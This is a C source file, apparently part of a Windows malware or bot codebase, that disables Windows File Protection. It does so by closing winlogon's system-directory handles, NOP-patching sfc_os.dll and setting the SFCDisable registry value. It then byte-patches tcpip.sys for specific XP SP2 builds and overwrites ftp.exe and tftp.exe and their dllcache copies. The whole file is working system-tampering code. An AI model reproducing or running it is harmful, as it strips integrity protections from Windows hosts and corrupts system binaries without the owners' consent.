#include "includes.h"
#include "functions.h"
#include "vscandef.h"
#include "replace.h"

#ifndef NO_WFP

void patch_system(BOOL unpatch/*=FALSE*/)
{
	char dpath[MAX_PATH], mpath[MAX_PATH], sysdir[MAX_PATH];

	if (!disable_wfp())
	{
#ifdef _DEBUG
		printf("Failed to disable WFP.\n");
#endif
		return;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	_snprintf(mpath, sizeof(mpath), "%s\\drivers\\tcpip.sys", sysdir);
	_snprintf(dpath, sizeof(dpath), "%s\\dllcache\\tcpip.sys", sysdir);

	if (patch_tcpip(mpath,unpatch))
	{
#ifdef _DEBUG
		printf("Patched %s.\n",mpath);
#endif
	}
	else
	{
#ifdef _DEBUG
		printf("Failed to patch %s.\n",mpath);
#endif
	}

	if (patch_tcpip(dpath,unpatch))
	{
#ifdef _DEBUG
		printf("Patched %s.\n",dpath);
#endif
	}
	else
	{
#ifdef _DEBUG
		printf("Failed to patch %s.\n",dpath);
#endif
	}

	if (patch_ftps(unpatch))
	{
#ifdef _DEBUG
		printf("Patched FTPs.\n");
#endif
	}
	else
	{
#ifdef _DEBUG
		printf("Failed to patch FTPs.\n");
#endif
	}
	
	return;
}

void replace_file(char *path)
{
	FILE *fp;
	SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
	if ((fp = fopen(path,"r+b")) == NULL)
		return;
	fseek(fp, 0, SEEK_SET);
	long t=FileSize(path);
	if (t>REPLACE_SIZE)
	{
		for (long i=0; i<t; i++)
		{
			if (i>REPLACE_SIZE)
				fwrite("\x00", sizeof(char), 1, fp);
			else
				fwrite(&replace[i], sizeof(char), 1, fp);
		}
	}
	else
	{
		for (long i=0; i<t; i++)
			fwrite("\x00", sizeof(char), 1, fp);
	}
	fclose(fp);
}

BOOL patch_ftps(BOOL unpatch/*=FALSE*/)
{
	char mpath[MAX_PATH], dpath[MAX_PATH], sysdir[MAX_PATH], tpath[MAX_PATH],
		 tmpath[MAX_PATH], tdpath[MAX_PATH], ttpath[MAX_PATH];

	GetSystemDirectory(sysdir, sizeof(sysdir));
	_snprintf(mpath, MAX_PATH, "%s\\ftp.exe", sysdir);
	_snprintf(dpath, MAX_PATH, "%s\\dllcache\\ftp.exe", sysdir);
	_snprintf(tpath, MAX_PATH, "%s\\microsoft\\backup.ftp", sysdir);
	_snprintf(tmpath, MAX_PATH, "%s\\tftp.exe", sysdir);
	_snprintf(tdpath, MAX_PATH, "%s\\dllcache\\tftp.exe", sysdir);
	_snprintf(ttpath, MAX_PATH, "%s\\microsoft\\backup.tftp", sysdir);

	SetFileAttributes(mpath,FILE_ATTRIBUTE_NORMAL);
	SetFileAttributes(dpath,FILE_ATTRIBUTE_NORMAL);
	SetFileAttributes(tmpath,FILE_ATTRIBUTE_NORMAL);
	SetFileAttributes(tdpath,FILE_ATTRIBUTE_NORMAL);
	SetFileAttributes(tpath,FILE_ATTRIBUTE_NORMAL);
	SetFileAttributes(ttpath,FILE_ATTRIBUTE_NORMAL);

	if (unpatch)
	{
		if (FileExists(tpath))
		{
			CopyFile(tpath,dpath,FALSE);
			CopyFile(tpath,mpath,FALSE);
		}
		if (FileExists(ttpath))
		{
			CopyFile(ttpath,tmpath,FALSE);
			CopyFile(ttpath,tdpath,FALSE);
		}
		return TRUE;
	}
	
	if (!FileExists(tpath) && FileExists(mpath))
		CopyFile(mpath,tpath,FALSE);

	if (!FileExists(ttpath) && FileExists(tmpath))
		CopyFile(tmpath,ttpath,FALSE);

	replace_file(mpath);
	replace_file(dpath);
	replace_file(tmpath);
	replace_file(tdpath);

	return TRUE;
}

BOOL patch_tcpip(char *path, BOOL unpatch/*=FALSE*/)
{
	FILE *fp;
	char *mp;
	unsigned long ml;
	int crc;
	BOOL go=FALSE;
	OSVERSIONINFO vi;

	SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);

	vi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&vi);
	if (vi.dwMajorVersion != 5 || vi.dwMinorVersion != 1 ||
		strcmp(vi.szCSDVersion,"Service Pack 2"))
		return FALSE;

	if ((fp = fopen(path,"r+b")) == NULL)
		return FALSE;

	if (fseek(fp, 0, SEEK_END))
	{
		fclose(fp);
		return FALSE;
	}

	ml = ftell(fp);
	mp = (char *)malloc(ml);
	if (!mp)
	{
		fclose(fp);
		return FALSE;
	}

	fseek(fp, 0, SEEK_SET);
	fread(mp, 1, ml, fp);

	switch(crc = crc32N(mp, ml))
	{
		case 2151852539://5.1.2600.2180
#ifdef _DEBUG
			printf("Tcpip.sys: Patching build 2180.\n");
#endif
			memcpy(mp + 0x130,		"\x2C", 1);
			memcpy(mp + 0x131,		"\x13", 1);
			memcpy(mp + 0x132,		"\x06", 1);
			memcpy(mp + 0x133,		"\x00", 1);
			memcpy(mp + 0x4F322,	"\xC8", 1);
			memcpy(mp + 0x4F323,	"\x00", 1);
			memcpy(mp + 0x4F324,	"\x00", 1);
			memcpy(mp + 0x4F325,	"\x00", 1);
			go=TRUE;
			break;
			
		case 3886810835:
#ifdef _DEBUG
			printf("Tcpip.sys: Patching unknown build.\n");
#endif
			memcpy(mp + 0x130,		"\xBC", 1);
			memcpy(mp + 0x131,		"\x28", 1);
			memcpy(mp + 0x132,		"\x06", 1);
			memcpy(mp + 0x133,		"\x00", 1);
			memcpy(mp + 0x4F5A2,	"\xFE", 1);
			memcpy(mp + 0x4F5A3,	"\xFF", 1);
			memcpy(mp + 0x4F5A4,	"\xFF", 1);
			memcpy(mp + 0x4F5A5,	"\x00", 1);
			go=TRUE;
			break;

		case 646861680://5.1.2600.2505
#ifdef _DEBUG
			printf("Tcpip.sys: Patching build 2505.\n");
#endif
			memcpy(mp + 0x130,		"\xE5", 1);
			memcpy(mp + 0x4F322,	"\xC8", 1);
			go=TRUE;
			break;

		case 3246854107://5.1.2600.2685
#ifdef _DEBUG
			printf("Tcpip.sys: Patching build 2685.\n");
#endif
			memcpy(mp + 0x130,		"\x99", 1);
			memcpy(mp + 0x131,		"\x47", 1);
			memcpy(mp + 0x4F5A2,	"\xC8", 1);
			go=TRUE;
			break;

		case 3732964686://5.1.2600.2180 Patched
		case 2826512337://2 patched?
		case 2967956556://5.1.2600.2505 Patched
		case 3719689691://5.1.2600.2685 Patched
#ifdef _DEBUG
			printf("Tcpip.sys: Already patched.\n");
#endif
			break;
		default:
#ifdef _DEBUG
			printf("Tcpip.sys: Unknown version.\n");
#endif
			break;
	}

	if (go)
	{
		fseek(fp, 0, SEEK_SET);
		fwrite(mp, 1, ml, fp);
	}
	free(mp);
	fclose(fp);
	if (go)	return TRUE;
	return FALSE;
}

NTSTATUS (NTAPI *fNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
NTSTATUS (NTAPI *fNtQueryObject)(HANDLE ObjectHandle, OBJECT_INFORMATION_CLASS ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
DWORD (WINAPI *fGetModuleFileNameExW)(HANDLE hProcess, HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
int (WINAPI *fwsprintfW)(LPWSTR lpOut, LPCWSTR lpFmt, ...);
LONG (WINAPI *fRegSetValueExW)(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, CONST BYTE* lpData, DWORD cbData);
LONG (WINAPI *fRegOpenKeyExW)(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);

VOID get_filename(WCHAR *Name)
{
	WCHAR *path, *New, *ptr;

	path = (PWCHAR) malloc((MAX_PATH + 1) * sizeof (WCHAR));
	New = (PWCHAR) malloc((MAX_PATH + 1) * sizeof (WCHAR));

	wcsncpy(path, Name, MAX_PATH);

	if(wcsncmp(path, L"\\SystemRoot", 11) == 0)
	{
		ptr = &path[11];  
		GetWindowsDirectoryW(New, MAX_PATH * sizeof (WCHAR));
		wcscat(New, ptr);
		wcscpy(Name, New);
	}
	else if(wcsncmp(path, L"\\??\\", 4) == 0)
	{
		ptr = &path[4];
		wcscpy(New, ptr);
		wcscpy(Name, New);
	}

	free(path);
	free(New);
}

BOOL set_privileges(VOID)
{
	HANDLE token;
	LUID luid;
	TOKEN_PRIVILEGES tp;
	BOOL ret=FALSE;

	if (fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &token))
	{
		if (fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
		{
			ZeroMemory (&tp, sizeof (tp));
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (fAdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL))
				ret=TRUE;
		}
		CloseHandle(token);
	}
	return ret;
}

BOOL cmpstrb(WCHAR *Str1, WCHAR *Str2)
{
	INT Len1 = wcslen(Str1), Len2 = wcslen(Str2);

	if (Len2 > Len1)
		return FALSE;

	for (Len2--, Len1--; Len2 >= 0; Len2--, Len1--)
	{
		if (Str1[Len1] != Str2[Len2])
			return FALSE;
	}

	return TRUE;
}

BOOL disable_wfp(VOID)
{
	HINSTANCE hNtDll, hPsApi, hUser32, hAdvapi;
	PSYSTEMHANDLEINFO pSystemHandleInfo = NULL;
	ULONG uSize = 0x1000, i, uBuff;
	NTSTATUS nt;

	// psapi variables
	LPDWORD lpdwPIDs = NULL;
	DWORD WinLogonId;
	DWORD dwSize;
	DWORD dwSize2;
	DWORD dwIndex;
	HMODULE hMod;
	HANDLE hProcess, hWinLogon;
	DWORD dwLIndex = 0;

	WCHAR Buffer[MAX_PATH + 1];
	WCHAR Buffer2[MAX_PATH + 1];
	WCHAR WinLogon[MAX_PATH + 1];

	HANDLE hCopy;

	struct { UNICODE_STRING Name; WCHAR Buffer[MAX_PATH + 1]; } ObjName;

	OSVERSIONINFOEX osvi;

	HANDLE hFile;
	DWORD dwFileSize, BRW = 0, dwCount;
	BYTE *pSfc, *pCode;
	BOOL bFound = FALSE;

	PIMAGE_DOS_HEADER ImgDosHeader;
	PIMAGE_NT_HEADERS ImgNtHeaders;
	PIMAGE_SECTION_HEADER ImgSectionHeader;

	HKEY Key;
	LONG Ret;

	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if (!GetVersionEx((OSVERSIONINFO *)&osvi))
	{
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if (!GetVersionEx((OSVERSIONINFO *)&osvi))
			return FALSE;
	}

	if (osvi.dwPlatformId != VER_PLATFORM_WIN32_NT || osvi.dwMajorVersion <= 4)
		return FALSE;

	hNtDll = LoadLibrary("ntdll.dll");
	hPsApi = LoadLibrary("psapi.dll");
	hUser32 = LoadLibrary("user32.dll");
	hAdvapi = LoadLibrary("advapi32.dll");

	if (!hNtDll || !hPsApi || !hUser32 || !hAdvapi)
		return FALSE;

	// ntdll functions
	fNtQuerySystemInformation = (NTSTATUS (NTAPI *)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG)) GetProcAddress(hNtDll, "NtQuerySystemInformation");
	fNtQueryObject = (NTSTATUS (NTAPI *)(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG)) GetProcAddress(hNtDll, "NtQueryObject");

	// psapi functions
	fGetModuleFileNameExW = (DWORD (WINAPI *)(HANDLE, HMODULE, LPWSTR, DWORD)) GetProcAddress(hPsApi, "GetModuleFileNameExW");

	// user32 functions
	fwsprintfW = (int (WINAPI *)(LPWSTR, LPCWSTR, ...)) GetProcAddress(hUser32, "wsprintfW");

	// advapi32 functions
	fRegSetValueExW = (LONG (WINAPI *)(HKEY, LPCWSTR, DWORD, DWORD, CONST BYTE*, DWORD)) GetProcAddress(hAdvapi, "RegSetValueExW");
	fRegOpenKeyExW = (LONG (WINAPI *)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY)) GetProcAddress(hAdvapi, "RegOpenKeyExW");

	if (fNtQuerySystemInformation	== NULL ||
        fNtQueryObject				== NULL ||
        fEnumProcesses				== NULL ||
        fEnumProcessModules			== NULL ||
        fGetModuleFileNameExW		== NULL ||
		fwsprintfW					== NULL ||
		fRegOpenKeyExW				== NULL)
        return FALSE;

	// winlogon position
	GetSystemDirectoryW(WinLogon, MAX_PATH * sizeof (WCHAR));
	wcscat(WinLogon, L"\\winlogon.exe");

	// set privileges
	if (!set_privileges())
		return FALSE;

	// search winlogon
	dwSize2 = 256 * sizeof(DWORD);
	do
	{
		if (lpdwPIDs)
		{
			HeapFree(GetProcessHeap(), 0, lpdwPIDs);
			dwSize2 *= 2;
		}

		lpdwPIDs = (LPDWORD) HeapAlloc(GetProcessHeap(), 0, dwSize2);

		if (lpdwPIDs == NULL)
			return FALSE;

		if (!fEnumProcesses(lpdwPIDs, dwSize2, &dwSize))
			return FALSE;

	} while (dwSize == dwSize2);

	dwSize /= sizeof(DWORD);

	for (dwIndex=0; dwIndex<dwSize; dwIndex++)
	{
		Buffer[0] = 0;
    
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lpdwPIDs[dwIndex]);
		if (hProcess != NULL)
		{
			if (fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &dwSize2))
			{
				if (!fGetModuleFileNameExW(hProcess, hMod, Buffer, sizeof(Buffer)))
				{
					CloseHandle(hProcess);
					continue;
				}
			}
			else
			{
				CloseHandle(hProcess);
				continue;
			}

			if (Buffer[0] != 0)
			{
				get_filename(Buffer);
				if (CompareStringW(0, NORM_IGNORECASE, Buffer, -1, WinLogon, -1) == CSTR_EQUAL)
				{
					// winlogon process found
					WinLogonId = lpdwPIDs[dwIndex];
					CloseHandle(hProcess);
					break;
				}
				dwLIndex++;
			}
			CloseHandle(hProcess);
		}
	}

	if (lpdwPIDs)
		HeapFree(GetProcessHeap(), 0, lpdwPIDs);

	hWinLogon = OpenProcess(PROCESS_DUP_HANDLE, 0, WinLogonId);

	if (hWinLogon == NULL)
		return FALSE;

	nt = fNtQuerySystemInformation(SystemHandleInformation, NULL, 0, &uSize);
	while (nt == STATUS_INFO_LENGTH_MISMATCH)
	{
		uSize += 0x1000;

		if (pSystemHandleInfo)
			VirtualFree(pSystemHandleInfo, 0, MEM_RELEASE);

		pSystemHandleInfo = (PSYSTEMHANDLEINFO)VirtualAlloc(NULL, uSize, MEM_COMMIT, PAGE_READWRITE);

		if (pSystemHandleInfo == NULL)
		{
			CloseHandle(hWinLogon);
			return FALSE;
		}
		nt = fNtQuerySystemInformation(SystemHandleInformation, pSystemHandleInfo, uSize, &uBuff);
	}

	if (nt != STATUS_SUCCESS)
	{
		VirtualFree(pSystemHandleInfo, 0, MEM_RELEASE);
		CloseHandle(hWinLogon);
		return FALSE;
	}
    
	for (i=0; i<pSystemHandleInfo->nHandleEntries; i++)
	{
		if (pSystemHandleInfo->HandleInfo[i].Pid == WinLogonId)
		{
			if (DuplicateHandle(hWinLogon, (HANDLE)pSystemHandleInfo->HandleInfo[i].HandleValue, GetCurrentProcess(), &hCopy, 0, FALSE, DUPLICATE_SAME_ACCESS))
			{
				nt = fNtQueryObject(hCopy, ObjectNameInformation, &ObjName, sizeof (ObjName),NULL);
				if (nt == STATUS_SUCCESS)
				{
					wcsupr(ObjName.Buffer);

					if (cmpstrb(ObjName.Buffer, L"WINDOWS\\SYSTEM32") ||
						cmpstrb(ObjName.Buffer, L"WINNT\\SYSTEM32"))
					{
						// disable wfp on the fly
						CloseHandle(hCopy);
						DuplicateHandle (hWinLogon, (HANDLE)pSystemHandleInfo->HandleInfo[i].HandleValue, GetCurrentProcess(), &hCopy, 0, FALSE, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
						CloseHandle(hCopy);
					}
				}
				else
				{
					CloseHandle(hCopy);
				}
			}
		}
	}

	VirtualFree(pSystemHandleInfo, 0, MEM_RELEASE);
	CloseHandle(hWinLogon);

	// patch wfp smartly
	GetSystemDirectoryW(Buffer, sizeof (WCHAR) * MAX_PATH);
	GetSystemDirectoryW(Buffer2, sizeof (WCHAR) * MAX_PATH);

	fwsprintfW(Buffer2, L"%s\\trash%X", Buffer2, GetTickCount());

	if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0) // win2k
		wcscat(Buffer, L"\\sfc.dll");

	else // winxp, win2k3
		wcscat(Buffer, L"\\sfc_os.dll");

	hFile = CreateFileW(Buffer, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	dwFileSize = GetFileSize(hFile, NULL);
	pSfc = (BYTE *)VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);
	if (!pSfc)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	if (!ReadFile(hFile, pSfc, dwFileSize, &BRW, NULL))
	{
		CloseHandle(hFile);
		VirtualFree(pSfc, 0, MEM_RELEASE);
		return FALSE;
	}

	CloseHandle(hFile);

	ImgDosHeader = (PIMAGE_DOS_HEADER) pSfc;
	ImgNtHeaders = (PIMAGE_NT_HEADERS) (ImgDosHeader->e_lfanew + (ULONG_PTR) pSfc);
	ImgSectionHeader = IMAGE_FIRST_SECTION(ImgNtHeaders);

	// code section
	pCode = (BYTE *) (ImgSectionHeader->PointerToRawData + (ULONG_PTR) pSfc);

	// i gotta find the bytes to patch
	for (dwCount = 0; dwCount < (ImgSectionHeader->SizeOfRawData - 10); dwCount++)
	{
		if (pCode[dwCount] == 0x8B && pCode[dwCount+1] == 0xC6 &&
			pCode[dwCount+2] == 0xA3 && pCode[dwCount+7] == 0x3B &&
			pCode[dwCount+9] == 0x74 && pCode[dwCount+11] == 0x3B)
		{
			bFound = TRUE;
			break;
		}
	}

    if (bFound)
    {
		// patch
		pCode[dwCount] = pCode[dwCount + 1] = 0x90;

		// move dll to another place
		MoveFileW(Buffer, Buffer2);

		// create new dll
		hFile = CreateFileW(Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == INVALID_HANDLE_VALUE)
		{
			// cannot patch
			VirtualFree(pSfc, 0, MEM_RELEASE);
			return FALSE;
		}

		WriteFile(hFile, pSfc, dwFileSize, &BRW, NULL);
		CloseHandle(hFile);
    }

	VirtualFree(pSfc, 0, MEM_RELEASE);

	// modify the registry
	Ret = fRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &Key);
	if (Ret != ERROR_SUCCESS)
		return FALSE;

	BRW = 0xFFFFFF9D;
	Ret = fRegSetValueExW(Key, L"SFCDisable", 0, REG_DWORD, (PBYTE) &BRW, sizeof (BRW));
	if (Ret != ERROR_SUCCESS)
	{
		fRegCloseKey(Key);
		return FALSE;
	}

	BRW = 0;
	Ret = fRegSetValueExW(Key, L"SFCScan", 0, REG_DWORD, (PBYTE) &BRW, sizeof (BRW));
	if (Ret != ERROR_SUCCESS)
	{
		fRegCloseKey(Key);
		return FALSE;
	}
	fRegCloseKey(Key);
	return TRUE;
}

static unsigned long crc_table[256];

static void make_crc_table()
{
	unsigned int i, j;
	unsigned long h = 1;
	crc_table[0] = 0;
	for (i = 128; i; i >>= 1)
	{
		h = (h >> 1) ^ ((h & 1) ? POLYNOMIAL : 0);
		for (j = 0; j < 256; j += 2*i)
			crc_table[i+j] = crc_table[j] ^ h;
	}
}

static unsigned long crc32(unsigned long crc, const char *buf, size_t len)
{
	if (crc_table[255] == 0)
		make_crc_table();
	crc ^= 0xffffffff;
	while (len--)
		crc = (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];
	return crc ^ 0xffffffff;
}

int crc32N(const void * buf, int len)
{
	unsigned long crc;
	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, (char*)buf, len);
	return crc;
}

#endif
